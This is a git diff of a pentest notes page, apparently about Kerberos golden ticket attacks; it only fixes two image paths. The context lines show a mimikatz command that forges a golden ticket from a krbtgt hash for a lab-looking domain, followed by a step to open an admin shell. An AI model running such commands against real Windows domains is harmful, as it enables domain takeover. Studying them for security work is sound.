@@ -37,7 +37,7 @@ assuming that we got access to administrator NTLM hash, we can move on with the 
 kerberos::golden /user:client1 /domain:megacorp.local /sid:S-1-5-21-4081310294-3909750490-1069944866 /krbtgt:43e603fc59a5705d8a9f7c1c0a45b85e /id:500 /ptt
 ```
 
-![](../../../../.gitbook/assets/image%20%28200%29.png)
+![](../../../.gitbook/assets/image%20%28200%29.png)
 
 now we can get a shell with admin privileges:
 
@@ -45,7 +45,7 @@ now we can get a shell with admin privileges:
 misc::cmd
 ```
 
-![](../../../../.gitbook/assets/image%20%28201%29.png)
+![](../../../.gitbook/assets/image%20%28201%29.png)
 
 or using psexe:
 
